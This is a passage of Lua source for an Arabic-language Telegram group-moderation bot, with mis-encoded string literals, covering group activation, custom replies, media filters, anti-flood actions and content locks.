tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'ููุดุฆ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ุงุฏูู'
else 
status = 'ุนุถู'
end
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Devmfm:sadd(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Devmfm:srem(mustafa.."mfm:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Devmfm:srem(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Devmfm:sismember(mustafa..'mfm:Groups',msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุฌููุนู ุจุงูุชุงููุฏ ููุนูู', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู ุงูู ูู โซ *'..(Devmfm:get(mustafa..'mfm:Num:Add:Bot') or 0)..'* ุนุถู', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","โ๏ธุชู ุชูุนูู ุงููุฌููุนู "..dp.title_)  
Devmfm:sadd(mustafa.."mfm:Groups",msg.chat_id_)
Devmfm:sadd(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'ูุง ููุฌุฏ'
end
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"โ๏ธุชู ุชูุนูู ูุฌููุนู ุฌุฏูุฏู โซ โค \nโ โ โ โ โ โ โ โ โ\nโ๏ธุจูุงุณุทุฉ โซ "..Name.."\nโ๏ธูููุนู ูู ุงููุฌููุนู โซ "..status.."\nโ๏ธุงุณู ุงููุฌููุนู โซ ["..NameChat.."]\nโ๏ธุนุฏุฏ ุงุนุถุงุก ุงููุฌููุนู โซ โจ *"..NumMem.."* โฉ\nโ๏ธุงูุฏู ุงููุฌููุนู โซ โค \nโจ `"..msg.chat_id_.."` โฉ\nโ๏ธุฑุงุจุท ุงููุฌููุนู โซ โค\nโจ ["..LinkGroup.."] โฉ\nโ โ โ โ โ โ โ โ โ\nโ๏ธุงูููุช โซ "..os.date("%I:%M%p").."\nโ๏ธุงูุชุงุฑูุฎ โซ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุชูุนูู ูุฐู ุงููุฌููุนู ุจุณุจุจ ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู', 1, 'md') 
end 
end 
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Devmfm:set(mustafa..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
local ReFalse = tostring(msg.chat_id_)
if not Devmfm:sismember(mustafa.."mfm:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False [ Not Enable ]")
return false
end
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if Devmfm:get(mustafa.."mfm:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธุงูุตูุฑู ุงูุชู ุงุฑุณูุชูุง ุชู ููุนูุง ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธุงููุชุญุฑูู ุงูุชู ุงุฑุณูุชูุง ุชู ููุนูุง ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = Devmfm:smembers(mustafa.."mfm:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","โ๏ธุงูููุตู ุงูุฐู ุงุฑุณูุชู ุชู ููุนู ูู ุงููุฌููุนู")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
if text and text:match("^(.*)$") then
local DelGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if DelGpRed == 'DelGpRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงููููู โซ '..msg.content_.text_..' ุชู ุญุฐููุง',  1, "html")
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
Devmfm:srem(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธุงููููู โซ '..msg.content_.text_..' ุชู ุญุฐููุง',  1, "html")
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
Devmfm:del(mustafa.."mfm:Gif:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Voice:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Audio:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Photo:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Video:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:File:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Text:AllRed"..msg.content_.text_)
Devmfm:del(mustafa.."mfm:Sudo:AllRed",msg.content_.text_)
return false
end
end
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = Devmfm:get(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SaveGpRed == 'SaveGpRed' then 
if text == 'ุงูุบุงุก' then
local DelManagerRep = Devmfm:get(mustafa..'DelManagerRep'..msg.chat_id_..'')
Devmfm:srem(mustafa..'mfm:Manager:GpRed'..msg.chat_id_..'',DelManagerRep)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ', 1, 'md')
Devmfm:del(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_)
Devmfm:del(mustafa..'DelManagerRep'..msg.chat_id_..'')
return false
end
Devmfm:del(mustafa..'mfm:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
local SaveGpRed = Devmfm:get(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then Devmfm:set(mustafa..'mfm:Video:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then Devmfm:set(mustafa..'mfm:File:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then Devmfm:set(mustafa..'mfm:Stecker:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then Devmfm:set(mustafa..'mfm:Voice:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then Devmfm:set(mustafa..'mfm:Audio:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Devmfm:set(mustafa..'mfm:Photo:GpRed'..SaveGpRed..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then Devmfm:set(mustafa..'mfm:Gif:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
Devmfm:set(mustafa..'mfm:Text:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ุงูุฑุฏ ุงูุฌุฏูุฏ', 1, 'md') 
Devmfm:del(mustafa..'mfm:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Devmfm:del(mustafa..'DelManagerRep'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not Devmfm:get(mustafa..'mfm:Lock:GpRed'..msg.chat_id_) then 
if Devmfm:get(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Devmfm:get(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa..'mfm:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Devmfm:get(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa..'mfm:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..''))
end
if Devmfm:get(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then
function mustafaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ูุง ููุฌุฏ' end
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Devmfm:get(mustafa..'mfm:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'ูุง ููุฌุฏ')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = Devmfm:get(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'ุงูุบุงุก' then
local DelSudoRep = Devmfm:get(mustafa..'DelSudoRep')
Devmfm:del(mustafa.."mfm:Sudo:AllRed",DelSudoRep)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ', 1, 'md')
Devmfm:del(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
Devmfm:del(mustafa.."DelSudoRep")
return false
end
Devmfm:del(mustafa.."mfm:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = Devmfm:get(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
Devmfm:set(mustafa.."mfm:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
Devmfm:set(mustafa.."mfm:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
Devmfm:set(mustafa.."mfm:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
Devmfm:set(mustafa.."mfm:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
Devmfm:set(mustafa.."mfm:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Devmfm:set(mustafa.."mfm:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
Devmfm:set(mustafa.."mfm:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
Devmfm:set(mustafa.."mfm:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ุงูุฑุฏ ุงูุฌุฏูุฏ', 1, 'md') 
Devmfm:del(mustafa.."mfm:Add:AllText"..msg.sender_user_id_)
Devmfm:del(mustafa..'DelSudoRep')
return false end end
if msg.content_.text_ and not Devmfm:get(mustafa..'mfm:Lock:AllRed'..msg.chat_id_) then
if Devmfm:get(mustafa.."mfm:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:Video:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:File:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Voice:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Audio:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Photo:AllRed"..msg.content_.text_))
end
if  Devmfm:get(mustafa.."mfm:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Devmfm:get(mustafa.."mfm:Gif:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Devmfm:get(mustafa.."mfm:Stecker:AllRed"..msg.content_.text_))
end
if Devmfm:get(mustafa.."mfm:Text:AllRed"..msg.content_.text_) then
function mustafaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ูุง ููุฌุฏ' end
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Devmfm:get(mustafa.."mfm:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'ูุง ููุฌุฏ')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end 
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธุงูุนุถู โซ '..GetName..' \nโ๏ธูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ุทุฑุฏู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธุงูุนุถู โซ '..GetName..' \nโ๏ธูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ุชููุฏู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_, msg.sender_user_id_) then
Devmfm:sadd(mustafa..'mfm:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = 'โ๏ธุงูุนุถู โซ '..GetName..' \nโ๏ธูุงู ุจุงูุชูุฑุงุฑ ุงููุญุฏุฏ ุชู ูุชูู '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions mustafa --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= mustafa then
floods = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(Devmfm:get(mustafa.."mfm:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
Devmfm:setex(mustafa.."mfm:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = Devmfm:hget(mustafa.."mfm:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(mustafa) then
Devmfm:set(mustafa..'mfm:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = Devmfm:get(mustafa..'mfm:PinnedMsg'..msg.chat_id_)
if pin_id and Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if Devmfm:get(mustafa..'mfm:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
Devmfm:del(mustafa..'mfm:viewget'..msg.sender_user_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฏุฏ ูุดุงูุฏุงุช ุงูููุดูุฑ ูู โซ ('..msg.views_..')', 1, 'md')
Devmfm:del(mustafa..'mfm:viewget'..msg.sender_user_id_)
end
end
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
